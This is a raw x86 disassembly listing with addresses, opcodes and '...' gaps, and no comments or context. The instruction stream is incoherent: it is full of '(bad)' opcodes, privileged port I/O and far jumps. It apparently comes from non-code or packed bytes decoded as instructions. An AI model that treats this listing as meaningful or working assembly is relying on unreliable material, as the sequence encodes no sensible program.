  41a0f5:	data16 js 0x41a101
  41a0f8:	call   0xb777bb0a
  41a0fd:	dec    edx
  41a0fe:	int3   
  41a0ff:	jmp    0x41a14f
  41a101:	into   
  41a102:	jl     0x41a125
  41a104:	fistp  WORD PTR es:[ecx-0x41415146]
  41a10b:	inc    eax
  41a10c:	cli    
  41a10d:	inc    esi
  41a10e:	or     BYTE PTR [ecx],dl
  41a110:	or     BYTE PTR [ebp-0x1f],ch
  41a113:	call   0x947ff231
  41a118:	add    al,0x93
  41a11a:	lods   eax,DWORD PTR ds:[esi]
  41a11b:	loope  0x41a14c
  41a11d:	push   ebx
  41a11e:	add    BYTE PTR [esi+0x19],cl
  41a121:	xchg   esp,eax
  41a122:	popf   
  41a123:	push   esi
  41a124:	fld    TBYTE PTR [edi]
  41a126:	in     eax,dx
  41a127:	not    edi
  41a129:	in     eax,dx
  41a12a:	cmp    edx,DWORD PTR [edi-0x5406c39a]
  41a130:	mov    bl,0xe5
  41a132:	sub    bh,0x2b
  41a135:	jmp    0x41a0fa
  41a137:	push   es
  41a138:	xor    eax,0x45e4dea6
  41a13d:	adc    eax,0xf23315be
  41a142:	mov    dl,0xb5
  41a144:	mov    ebp,0x8420541d
  41a149:	(bad)  
  41a14a:	sbb    edi,ebp
  41a14c:	mov    eax,0xdff95176
  41a151:	iret   
  41a152:	xchg   DWORD PTR [ecx-0x7c866cd],edx
  41a158:	int    0xe1
  41a15a:	sahf   
  41a15b:	push   ss
  41a15c:	jecxz  0x41a154
  41a15e:	push   ecx
  41a15f:	push   ecx
  41a160:	cmp    DWORD PTR [esi-0x18],ebx
  41a163:	dec    esi
  41a164:	leave  
  41a165:	and    cl,BYTE PTR [edi-0x3540e8a4]
  41a16b:	mov    edx,0x1a3f98f1
  41a170:	inc    ebp
  41a171:	test   BYTE PTR [ebp+0x26],0xf1
  41a175:	sub    dl,BYTE PTR [eax-0x22]
  41a178:	int3   
  41a179:	or     eax,0x41905bf8
  41a17e:	xchg   edx,eax
  41a17f:	mov    edi,DWORD PTR fs:[edi+0x79]
  41a183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a184:	in     al,dx
  41a185:	loop   0x41a206
  41a187:	adc    DWORD PTR [esi],edx
  41a189:	daa    
  41a18a:	lock daa 
  41a18c:	add    dh,0xa
  41a18f:	in     eax,dx
  41a190:	inc    ecx
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	cs retf 0x8d67
  41a204:	es adc eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	pop    edi
  41a20d:	sar    BYTE PTR [ebx+0x59b85e8d],0xc7
  41a214:	pop    ss
  41a215:	xchg   edx,eax
  41a216:	fcmovu st,st(4)
  41a218:	stos   BYTE PTR es:[edi],al
  41a219:	jge    0x41a1f5
  41a21b:	outs   dx,DWORD PTR ds:[esi]
  41a21c:	add    eax,DWORD PTR [eax+eiz*1+0x4714f4fc]
  41a223:	mov    bl,0x5e
  41a225:	pusha  
  41a226:	sbb    DWORD PTR [esi],esp
  41a228:	loop   0x41a1c7
  41a22a:	inc    esp
  41a22b:	inc    edi
  41a22c:	retf   
  41a22d:	jl     0x41a1ea
  41a22f:	lds    ecx,FWORD PTR [edi+ebp*8-0x6]
  41a233:	mov    al,ds:0xf235f8af
  41a238:	mov    ebp,0xaa2d33a4
  41a23d:	jo     0x41a21b
  41a23f:	out    dx,eax
  41a240:	jecxz  0x41a28b
  41a242:	add    ecx,esp
  41a244:	mov    esp,0x682a33e
  41a249:	arpl   WORD PTR [eax+0x26],dx
  41a24c:	ret    
  41a24d:	xchg   ebp,eax
  41a24e:	push   ss
  41a24f:	lds    edi,FWORD PTR [eax+0x58]
  41a252:	retf   0x1f6c
  41a255:	xor    al,0x22
  41a257:	int3   
  41a258:	sub    esp,0xdd30b824
  41a25e:	dec    ebx
  41a25f:	int    0xf5
  41a261:	icebp  
  41a262:	dec    esp
  41a263:	mov    dh,BYTE PTR [ebx+0x6f]
  41a266:	mov    bh,0xb1
  41a268:	and    DWORD PTR [esi+ecx*1-0x2b],ebp
  41a26c:	xchg   edi,eax
  41a26d:	jmp    0x41a2c5
  41a26f:	(bad)  
  41a270:	(bad)  
  41a271:	out    dx,al
  41a272:	pop    eax
  41a273:	dec    edi
  41a274:	or     BYTE PTR [edi-0x13],dl
  41a277:	dec    DWORD PTR [ecx+0x7c]
  41a27a:	std    
  41a27b:	retf   0x75ef
  41a27e:	lods   eax,DWORD PTR ds:[esi]
  41a27f:	sub    DWORD PTR [esi+0x23],edi
  41a282:	jns    0x41a2d2
  41a284:	adc    BYTE PTR [edx+0x3a],ch
  41a287:	mov    bh,0x89
  41a289:	push   es
  41a28a:	lock inc esi
  41a28c:	jne    0x41a2b2
  41a28e:	mov    dl,0x18
  41a290:	mov    al,ds:0xb6240d8d
  41a295:	xor    al,0x38
  41a297:	push   cs
  41a298:	aaa    
  41a299:	adc    DWORD PTR [eax+0x5345c894],eax
  41a29f:	in     al,0x92
  41a2a1:	in     al,dx
  41a2a2:	mov    ecx,0x8c14a454
  41a2a7:	stos   BYTE PTR es:[edi],al
  41a2a8:	lods   al,BYTE PTR ds:[esi]
  41a2a9:	jl     0x41a237
  41a2ab:	mov    edi,0xa4185468
  41a2b0:	pop    edi
  41a2b1:	stos   BYTE PTR es:[edi],al
  41a2b2:	jbe    0x41a2ac
  41a2b4:	lds    eax,FWORD PTR [edx+0x119651e]
  41a2ba:	aaa    
  41a2bb:	mov    bh,0xc1
  41a2bd:	dec    ebx
  41a2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2bf:	imul   ebx,DWORD PTR [ecx+0x34],0xe66af0fc
  41a2c6:	pop    eax
  41a2c7:	dec    ecx
  41a2c8:	sbb    eax,0xe520bdce
  41a2cd:	xchg   BYTE PTR [ecx],bh
  41a2cf:	sub    al,BYTE PTR [esi]
  41a2d1:	xchg   esp,eax
  41a2d2:	dec    ebp
  41a2d3:	mov    bh,0x47
  41a2d5:	inc    ecx
  41a2d6:	sub    BYTE PTR [eax],0x8
  41a2d9:	inc    esp
  41a2da:	mov    ebx,0x445530c2
  41a2df:	fcmovnbe st,st(5)
  41a2e1:	mov    edx,0x6abb9f32
  41a2e6:	jbe    0x41a303
  41a2e8:	enter  0x6e1e,0x6d
  41a2ec:	pop    es
  41a2ed:	dec    eax
  41a2ee:	shl    DWORD PTR [ebp-0x293cd228],cl
  41a2f4:	mov    eax,0xf0127c48
  41a2f9:	ja     0x41a33c
  41a2fb:	jns    0x41a2e1
  41a2fd:	jae    0x41a2ad
  41a2ff:	jmp    0x41a2a5
  41a301:	jmp    0x41a35d
  41a303:	push   cs
  41a304:	cmc    
  41a305:	pop    es
  41a306:	loop   0x41a2f7
  41a308:	lds    edx,FWORD PTR [ebx+eiz*4+0x1c]
  41a30c:	inc    ecx
  41a30d:	xchg   ebp,eax
  41a30e:	les    ebx,FWORD PTR ds:0x79
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	fisttp WORD PTR [ecx+0x72]
  41a383:	(bad)  
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x35000001
  41a38d:	xchg   ebx,ebp
  41a38f:	in     eax,dx
  41a390:	xchg   esp,eax
  41a391:	int    0x40
  41a393:	dec    edi
  41a394:	xchg   ebp,eax
  41a395:	xor    ecx,ecx
  41a397:	ficomp DWORD PTR [edx]
  41a399:	mov    ds:0xe655d1bc,al
  41a39e:	pop    es
  41a39f:	out    dx,eax
  41a3a0:	add    ebp,esi
  41a3a2:	dec    esp
  41a3a3:	jl     0x41a364
  41a3a5:	cmp    edi,DWORD PTR [edx+0x35]
  41a3a8:	lods   al,BYTE PTR ds:[esi]
  41a3a9:	jecxz  0x41a411
  41a3ab:	ret    
  41a3ac:	push   edx
  41a3ad:	and    eax,ebx
  41a3af:	mov    al,0xf7
  41a3b1:	mov    esp,0x57dd3fb1
  41a3b6:	fild   QWORD PTR [ebp+0x3ca9482d]
  41a3bc:	pop    eax
  41a3bd:	or     eax,0x377c0ec2
  41a3c2:	scas   al,BYTE PTR es:[edi]
  41a3c3:	lods   eax,DWORD PTR ds:[esi]
  41a3c4:	movaps XMMWORD PTR [esp+ebp*1-0x2979542c],xmm2
  41a3cc:	(bad)  
  41a3cd:	outs   dx,BYTE PTR ds:[esi]
  41a3ce:	pop    es
  41a3cf:	clc    
  41a3d0:	cmp    BYTE PTR [eax],dl
  41a3d2:	sub    eax,DWORD PTR [ebx-0x68e30ca8]
  41a3d8:	and    ebx,DWORD PTR es:[edi]
  41a3db:	or     ch,BYTE PTR [ebx-0x79]
  41a3de:	and    eax,0xca85a9ce
  41a3e3:	mov    cs,WORD PTR [esp+ebp*8+0x722e4995]
  41a3ea:	(bad)  
  41a3eb:	push   edi
  41a3ec:	in     eax,dx
  41a3ed:	imul   esi,DWORD PTR [edx],0x12c397fe
  41a3f3:	arpl   WORD PTR [eax-0x90458d],bx
  41a3f9:	lds    ebx,FWORD PTR [edi-0x3d]
  41a3fc:	inc    edi
  41a3fd:	jno    0x41a436
  41a3ff:	leave  
  41a400:	mov    ds:0x2d9b448c,al
  41a405:	mov    DWORD PTR [esi],ebp
  41a407:	jo     0x41a47f
  41a409:	adc    dh,BYTE PTR [edi]
  41a40b:	jecxz  0x41a3a1
  41a40d:	cwde   
  41a40e:	(bad)  
  41a40f:	mov    DWORD PTR [esi+0x66d7d450],esp
  41a415:	retw   0xa78b
  41a419:	(bad)  
  41a41b:	add    cl,BYTE PTR [edx-0x26]
  41a41e:	mov    esi,0x151337b
  41a423:	pop    edx
  41a424:	adc    al,0xc
  41a426:	or     BYTE PTR [edi+0x57fdacf9],cl
  41a42c:	jge    0x41a3f3
  41a42e:	mov    edi,0xd006f118
  41a433:	and    eax,esi
  41a435:	std    
  41a436:	stos   BYTE PTR es:[edi],al
  41a437:	fdiv   st(5),st
  41a439:	jmp    0x41a4ad
  41a43b:	mov    ebx,0x5dd78303
  41a440:	mov    al,ds:0x85c6593b
  41a445:	xchg   esp,eax
  41a446:	push   ebx
  41a447:	jmp    0xc06f:0xd760eebe
  41a44e:	shr    BYTE PTR [edi-0x27371269],0x4c
  41a455:	dec    ebx
  41a456:	into   
  41a457:	sbb    al,0xd1
  41a459:	outs   dx,DWORD PTR ds:[esi]
  41a45a:	test   eax,0xb1acc342
  41a45f:	(bad)  
  41a460:	mov    ebx,0x5d09f75
  41a465:	push   esp
  41a466:	cmp    cl,BYTE PTR [edi+0x783dde84]
  41a46c:	mov    bh,0xe4
  41a46e:	ret    0x7b27
  41a471:	test   DWORD PTR [ebx-0x73288d3c],esp
  41a477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a478:	pop    ss
  41a479:	inc    esi
  41a47a:	add    esi,DWORD PTR [ebx-0x1785e42f]
  41a480:	es lds ecx,FWORD PTR gs:[edi+esi*8]
  41a485:	push   ebp
  41a486:	mov    esp,0x7bcf67ed
  41a48b:	pop    ss
  41a48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a48d:	arpl   si,dx
  41a48f:	cmp    al,0xa0
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	jnp    0x41a52a
  41a502:	and    al,0x85
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0xe8000001
  41a50d:	js     0x41a566
  41a50f:	xchg   edx,eax
  41a510:	push   0x3d
  41a512:	sub    eax,0x874ff09
  41a517:	push   edi
  41a518:	xchg   esi,eax
  41a519:	or     ch,BYTE PTR [edx-0xe1cb396]
  41a51f:	pusha  
  41a520:	imul   esi,DWORD PTR [ebp+0x39],0x1d8da48
  41a527:	jecxz  0x41a4b9
  41a529:	add    bl,0x9a
  41a52c:	inc    edx
  41a52d:	and    al,0x10
  41a52f:	jp     0x41a4d0
  41a531:	nop
  41a532:	sub    al,0x94
  41a534:	fdiv   DWORD PTR [eax]
  41a536:	cwde   
  41a537:	inc    esp
  41a538:	pop    ecx
  41a539:	addr16 clc 
  41a53b:	pop    ecx
  41a53c:	and    dl,BYTE PTR [edi+0x1c1868fe]
  41a542:	fsub   QWORD PTR [eax+ebx*8+0x1e131588]
  41a549:	ins    BYTE PTR es:[edi],dx
  41a54a:	sub    al,0x89
  41a54c:	aam    0xda
  41a54e:	xchg   esp,eax
  41a54f:	ss ins DWORD PTR es:[edi],dx
  41a551:	or     al,0x28
  41a553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a554:	jae    0x41a523
  41a556:	and    al,0xdf
  41a558:	loop   0x41a5d8
  41a55a:	aad    0x6e
  41a55c:	adc    al,0x11
  41a55e:	xor    al,0x4
  41a560:	jbe    0x41a50c
  41a562:	addr16 mov bh,0x94
  41a565:	dec    ebx
  41a566:	cmp    eax,0x91893fa8
  41a56b:	dec    esp
  41a56c:	aas    
  41a56d:	jg     0x41a5aa
  41a56f:	icebp  
  41a570:	mov    edx,0x67ef3563
  41a575:	jmp    DWORD PTR [esp+esi*4]
  41a578:	pop    ecx
  41a579:	pop    edx
  41a57a:	data16 lahf 
  41a57c:	jmp    0x3f51:0xa1f2a516
  41a583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a584:	sub    BYTE PTR [ebp-0x2a],ch
  41a587:	mov    esi,0x1e82f3f
  41a58c:	push   eax
  41a58d:	sub    al,0xc4
  41a58f:	push   es
  41a590:	je     0x41a530
  41a592:	iret   
  41a593:	mov    ds:0xceac60bb,eax
  41a598:	sbb    edi,esp
  41a59a:	cmp    al,0x4b
  41a59c:	ret    
  41a59d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a59e:	xchg   esp,eax
  41a59f:	dec    edx
  41a5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a1:	xchg   ebx,eax
  41a5a2:	das    
  41a5a3:	inc    ebx
  41a5a4:	xor    al,0x6e
  41a5a6:	jmp    0x5272:0x2e3382a4
  41a5ad:	pop    esp
  41a5ae:	jne    0x41a55d
  41a5b0:	pop    esi
  41a5b1:	cld    
  41a5b2:	xor    DWORD PTR [eax+0x7a],eax
  41a5b5:	fucomp st(7)
  41a5b7:	xchg   edx,eax
  41a5b8:	fs push edi
  41a5ba:	inc    edx
  41a5bb:	dec    esp
  41a5bc:	xchg   ebp,eax
  41a5bd:	adc    al,0x4a
  41a5bf:	clc    
  41a5c0:	push   ecx
  41a5c1:	jbe    0x41a54a
  41a5c3:	ret    
  41a5c4:	sub    esi,DWORD PTR [ecx-0x5c]
  41a5c7:	icebp  
  41a5c8:	sbb    BYTE PTR [ecx],ch
  41a5ca:	xchg   ebx,eax
  41a5cb:	iret   
  41a5cc:	push   esp
  41a5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ce:	(bad)  
  41a5cf:	out    0x2f,eax
  41a5d1:	int    0xd
  41a5d3:	pop    edi
  41a5d4:	(bad)  
  41a5d6:	xchg   DWORD PTR [ebx+0x60114fdd],edx
  41a5dc:	or     dl,BYTE PTR [edi+0x5922ed71]
  41a5e2:	mov    eax,esp
  41a5e4:	sbb    bh,ah
  41a5e6:	ja     0x41a620
  41a5e8:	inc    esi
  41a5e9:	fadd   QWORD PTR [esi-0x251754cb]
  41a5ef:	mov    dl,0x44
  41a5f1:	jecxz  0x41a618
  41a5f3:	fldenv [ebx]
  41a5f5:	mov    ds:0xaf8359d,eax
  41a5fa:	nop
  41a5fb:	inc    esi
  41a5fc:	aaa    
  41a5fd:	test   eax,eax
  41a5ff:	stc    
  41a600:	add    eax,0x5e7edc1c
  41a605:	mov    al,ds:0x95225d88
  41a60a:	sbb    eax,0x36de551
  41a60f:	sub    esi,DWORD PTR [eax+0x0]
	...
  41a672:	add    BYTE PTR [eax],al
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xdd01a625
  41a682:	call   0x159dc2c
  41a687:	add    BYTE PTR ds:0xfd000001,al
  41a68d:	loopne 0x41a625
  41a68f:	fstp   QWORD PTR [edx]
  41a691:	in     al,0x3c
  41a693:	jb     0x41a6b1
  41a695:	mov    eax,0x52a5523d
  41a69a:	fidivr WORD PTR [edx-0x63]
  41a69d:	cli    
  41a69e:	or     al,0xf9
  41a6a0:	dec    ebx
  41a6a1:	fdiv   QWORD PTR [eax]
  41a6a3:	inc    esi
  41a6a4:	dec    edx
  41a6a5:	aas    
  41a6a6:	das    
  41a6a7:	jbe    0x41a686
  41a6a9:	inc    edx
  41a6aa:	inc    edi
  41a6ab:	add    eax,0x7d1ece3c
  41a6b0:	sbb    al,0x3a
  41a6b2:	in     al,0xa4
  41a6b4:	fisubr WORD PTR [esi-0x79]
  41a6b7:	mov    bl,0xef
  41a6b9:	(bad)  
  41a6ba:	sbb    BYTE PTR [eax-0x57],cl
  41a6bd:	push   ebp
  41a6be:	fimul  DWORD PTR [ebx+eiz*4+0x50]
  41a6c2:	mov    edi,0x4262c369
  41a6c7:	mov    dh,0xef
  41a6c9:	or     al,0x53
  41a6cb:	xchg   esi,eax
  41a6cc:	dec    edx
  41a6cd:	mov    eax,ds:0xca20aea4
  41a6d2:	dec    esi
  41a6d4:	pushf  
  41a6d5:	dec    edx
  41a6d6:	mov    al,ds:0x3e2b8f48
  41a6db:	mov    WORD PTR [esi+edx*8-0x5be50592],cs
  41a6e2:	and    dh,dl
  41a6e4:	mov    edi,0x1e3458af
  41a6e9:	mov    cl,0x47
  41a6eb:	cmp    BYTE PTR [eax],0x7f
  41a6ee:	ins    BYTE PTR es:[edi],dx
  41a6ef:	(bad)  
  41a6f0:	adc    al,0xc6
  41a6f2:	mov    esi,0x1613834b
  41a6f7:	inc    ecx
  41a6f8:	xor    al,0xbe
  41a6fa:	les    edx,FWORD PTR [esi]
  41a6fc:	mov    bh,0x8c
  41a6fe:	rol    DWORD PTR [ecx-0x413b2706],1
  41a704:	addr16 jno 0x41a6e2
  41a707:	test   eax,0xdd057f7e
  41a70c:	rcl    BYTE PTR [ecx-0x737c3e51],cl
  41a712:	inc    esi
  41a713:	dec    esp
  41a714:	pop    eax
  41a715:	and    al,BYTE PTR [eax-0x8]
  41a718:	ret    
  41a719:	cdq    
  41a71a:	mov    ah,0x71
  41a71c:	cmp    al,0xd5
  41a71e:	fimul  DWORD PTR [edi-0x1e90a8b6]
  41a724:	push   0x45
  41a726:	xchg   edx,eax
  41a727:	xchg   DWORD PTR [edx-0x225463e7],edi
  41a72d:	aam    0x32
  41a72f:	add    BYTE PTR [esi+0x357dae47],al
  41a735:	shr    dl,0xeb
  41a738:	rcr    DWORD PTR [edx],1
  41a73a:	cmp    eax,0x39df02e5
  41a73f:	ret    
  41a740:	test   al,0x2b
  41a742:	or     bl,BYTE PTR ds:0x442d3983
  41a748:	fnstsw WORD PTR [ebp+0x104dbcd5]
  41a74e:	popf   
  41a74f:	adc    eax,0x82125717
  41a754:	out    0xc,al
  41a756:	popa   
  41a757:	inc    edi
  41a758:	dec    esi
  41a759:	ins    DWORD PTR es:[edi],dx
  41a75a:	scas   eax,DWORD PTR es:[edi]
  41a75b:	lods   al,BYTE PTR ds:[esi]
  41a75c:	xor    eax,0xc2e4cd63
  41a761:	add    bh,BYTE PTR [edx-0x6b]
  41a764:	test   BYTE PTR [esi+0x60],0x5a
  41a768:	shl    DWORD PTR [edx+0x25],1
  41a76b:	in     al,0x7a
  41a76d:	xor    al,0x64
  41a76f:	ror    BYTE PTR ss:[ebx+0x6a45c7d2],cl
  41a776:	loope  0x41a7bb
  41a778:	pop    edi
  41a779:	aas    
  41a77a:	shr    DWORD PTR [edx+eiz*4],1
  41a77d:	push   ebp
  41a77e:	(bad)  
  41a77f:	pushf  
  41a780:	std    
  41a781:	xchg   edi,eax
  41a782:	mov    bh,0xbf
  41a784:	loopne 0x41a778
  41a786:	ins    BYTE PTR es:[edi],dx
  41a787:	(bad)  
  41a788:	outs   dx,DWORD PTR ds:[esi]
  41a789:	(bad)  
  41a78a:	icebp  
  41a78b:	pop    ebp
  41a78c:	stos   BYTE PTR es:[edi],al
  41a78d:	shr    DWORD PTR [edi+0x34],1
  41a790:	jnp    0x41a792
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x665327ca,al
  41a801:	shl    DWORD PTR [ecx],0xba
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0x1e000001
  41a80d:	add    DWORD PTR [esp+edi*8+0x3d],esi
  41a811:	sub    al,0xa1
  41a813:	adc    cl,bl
  41a815:	sbb    BYTE PTR [ecx+0x7a],bl
  41a818:	(bad)  
  41a81a:	or     eax,0xd449b274
  41a81f:	div    BYTE PTR [esi-0x46]
  41a822:	test   DWORD PTR [edx-0x682b589d],ebp
  41a828:	and    bl,0x64
  41a82b:	nop
  41a82c:	out    dx,eax
  41a82d:	pop    ebx
  41a82e:	mov    ebp,es
  41a830:	pusha  
  41a831:	inc    edi
  41a832:	rol    BYTE PTR [ecx+0x6a3e8eed],0xb8
  41a839:	inc    ebp
  41a83a:	fwait
  41a83b:	xchg   ebx,eax
  41a83c:	mov    al,0x7f
  41a83e:	stc    
  41a83f:	in     eax,0x83
  41a841:	test   eax,0xdbaee22f
  41a846:	push   ss
  41a847:	jmp    0x41a8a2
  41a849:	mov    ah,0xec
  41a84b:	out    0x79,eax
  41a84d:	imul   ebp,DWORD PTR [ecx-0x1],0x42
  41a851:	pop    ebx
  41a852:	shl    BYTE PTR [edx],cl
  41a854:	into   
  41a855:	add    dl,BYTE PTR [ecx-0x55]
  41a858:	xor    DWORD PTR [eax+0x4205c16a],esp
  41a85e:	xor    esp,DWORD PTR [esi-0x60c5f45]
  41a864:	sub    al,0xc8
  41a866:	cld    
  41a867:	adc    eax,0x61fe759b
  41a86c:	sar    DWORD PTR [esi],1
  41a86e:	add    eax,0x4654b55d
  41a873:	push   edi
  41a874:	pop    ss
  41a875:	push   0xffffff86
  41a877:	das    
  41a878:	dec    eax
  41a879:	cmc    
  41a87a:	cdq    
  41a87b:	dec    ebx
  41a87c:	sbb    eax,0xdea7adb4
  41a881:	add    bh,BYTE PTR [esi-0x6861fd2]
  41a887:	mov    esp,0x7be76cd1
  41a88c:	in     eax,dx
  41a88d:	aas    
  41a88e:	aad    0x6e
  41a890:	add    eax,0x14f33341
  41a895:	in     eax,dx
  41a896:	and    BYTE PTR [edx+0x3d6e695c],ah
  41a89c:	imul   eax,DWORD PTR [edx+0x5f],0xa
  41a8a0:	test   al,0xcb
  41a8a2:	cmc    
  41a8a3:	pushf  
  41a8a4:	sub    esi,DWORD PTR ds:0x66833270
  41a8aa:	test   BYTE PTR [ebp+0x146e1fd8],dh
  41a8b0:	xor    eax,0xd2b2ec8d
  41a8b5:	pop    ds
  41a8b6:	into   
  41a8b7:	sbb    al,0x1c
  41a8b9:	loopne 0x41a903
  41a8bb:	add    ebp,eax
  41a8bd:	mov    dl,0xe1
  41a8bf:	jb     0x41a8b9
  41a8c1:	xchg   edx,eax
  41a8c2:	js     0x41a84b
  41a8c4:	cli    
  41a8c5:	shr    ecx,1
  41a8c7:	(bad)  
  41a8c8:	xchg   edx,eax
  41a8c9:	pop    edi
  41a8ca:	lahf   
  41a8cb:	das    
  41a8cc:	sahf   
  41a8cd:	data16 xor al,0x4f
  41a8d0:	ror    DWORD PTR [edx+0x4f],0x7
  41a8d4:	xor    ebx,esi
  41a8d6:	inc    edi
  41a8d7:	mov    esi,0x29ed9a80
  41a8dc:	or     DWORD PTR [ecx-0x569d3b2e],ebx
  41a8e2:	scas   al,BYTE PTR es:[edi]
  41a8e3:	add    DWORD PTR [edi+eiz*2],edi
  41a8e6:	dec    esp
  41a8e7:	jmp    0xd1b0:0xe8b8c70b
  41a8ee:	jmp    0x2bc72db7
  41a8f3:	pop    ebp
  41a8f4:	add    DWORD PTR [eax],edi
  41a8f6:	cwde   
  41a8f7:	mov    al,0x96
  41a8f9:	fadd   DWORD PTR [ebp+0x10]
  41a8fc:	mov    edx,0xdaf348a3
  41a901:	cmc    
  41a902:	xchg   edx,eax
  41a903:	sub    dh,BYTE PTR [edi-0x3]
  41a906:	sub    eax,0x2847cd81
  41a90b:	lods   eax,DWORD PTR ds:[esi]
  41a90c:	xor    BYTE PTR [edi],bl
  41a90e:	jp     0x41a936
  41a910:	push   0x0
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	out    0xc4,eax
  41a982:	bound  eax,QWORD PTR [edx+0x3f]
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0xf7000001,al
  41a98d:	xor    bh,BYTE PTR [ebx+0x178b61e]
  41a993:	jle    0x41a9af
  41a995:	mov    DWORD PTR [esi],ebx
  41a997:	iret   
  41a998:	xor    al,0x9b
  41a99a:	pop    ecx
  41a99b:	mov    esp,0xc3becf45
  41a9a0:	ins    DWORD PTR es:[edi],dx
  41a9a1:	add    DWORD PTR [esi-0x2d550f40],esp
  41a9a7:	xor    dl,BYTE PTR [esi]
  41a9a9:	sub    al,0xc3
  41a9ab:	enter  0x47ec,0x1a
  41a9af:	jge    0x41a94b
  41a9b1:	outs   dx,BYTE PTR ds:[esi]
  41a9b2:	mov    eax,0x71a10ae5
  41a9b7:	cmp    eax,0xd7caf06f
  41a9bc:	sub    ebp,ecx
  41a9be:	lahf   
  41a9bf:	ja     0x41aa3f
  41a9c1:	push   ebx
  41a9c2:	aas    
  41a9c3:	fwait
  41a9c4:	stos   DWORD PTR es:[edi],eax
  41a9c5:	ret    
  41a9c6:	push   eax
  41a9c7:	xor    al,0xf1
  41a9c9:	arpl   WORD PTR [ebx+esi*2+0x35],bp
  41a9cd:	sub    dh,BYTE PTR [edi+0x59334777]
  41a9d3:	aam    0x11
  41a9d5:	dec    eax
  41a9d6:	data16 mov WORD PTR [ebx+edx*2-0x71],ds
  41a9db:	add    bh,BYTE PTR [ecx]
  41a9dd:	leave  
  41a9de:	fmul   st,st(3)
  41a9e0:	fisubr WORD PTR [ecx+0x706cb5f1]
  41a9e6:	rol    BYTE PTR [ecx-0x2f5fbe79],1
  41a9ec:	xor    ebp,ebx
  41a9ee:	mov    ds:0xc2cf18f3,eax
  41a9f3:	inc    eax
  41a9f4:	push   es
  41a9f5:	mov    esi,0xf6da9340
  41a9fa:	in     al,0xdc
  41a9fc:	add    eax,0xb4963e16
  41aa01:	sbb    ah,BYTE PTR [edi-0x6d]
  41aa04:	and    eax,0x34fe6dae
  41aa09:	cmp    BYTE PTR [esi+ecx*8],ah
  41aa0c:	out    0xa8,eax
  41aa0e:	pop    esi
  41aa0f:	cmp    ebp,edx
  41aa11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa12:	push   ebp
  41aa13:	mov    ecx,0x6e4d8430
  41aa18:	mov    bl,0xfe
  41aa1a:	jp     0x41aa72
  41aa1c:	adc    ecx,ebx
  41aa1e:	clc    
  41aa1f:	arpl   WORD PTR [edx],bx
  41aa21:	gs mov eax,0x968296e1
  41aa27:	les    ebx,FWORD PTR [eax+eax*4]
  41aa2a:	xor    eax,0xa220d402
  41aa2f:	xchg   esp,eax
  41aa30:	mov    ecx,0xca04d8d8
  41aa35:	mov    bh,0x52
  41aa37:	imul   BYTE PTR [edi+0x288eca44]
  41aa3d:	and    ebx,edi
  41aa3f:	fisubr DWORD PTR [ebp+ecx*1-0x15e6188d]
  41aa46:	and    BYTE PTR [esi-0x3f],dl
  41aa49:	dec    esp
  41aa4a:	cli    
  41aa4b:	xchg   BYTE PTR ds:0x4a7c809e,dh
  41aa51:	call   0x4061:0xa48d6899
  41aa58:	jmp    0x8f77:0xac75b086
  41aa5f:	clc    
  41aa60:	sbb    eax,0xfdaad35c
  41aa65:	imul   eax,DWORD PTR gs:[edi],0xffffffaa
  41aa69:	out    0x8d,al
  41aa6b:	push   0xbf694b60
  41aa70:	pop    ecx
  41aa71:	xchg   esp,eax
  41aa72:	ins    DWORD PTR es:[edi],dx
  41aa73:	mov    al,ds:0x5082a350
  41aa78:	adc    esi,DWORD PTR [eax+ebp*2-0x44994cce]
  41aa7f:	es stos DWORD PTR es:[edi],eax
  41aa81:	xchg   edx,eax
  41aa82:	ja     0x41aa4a
  41aa84:	fisubr WORD PTR [edx+edx*8+0x6d290e28]
  41aa8b:	retf   0x86c4
  41aa8e:	push   0xdf58
	...
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	jno    0x41ab27
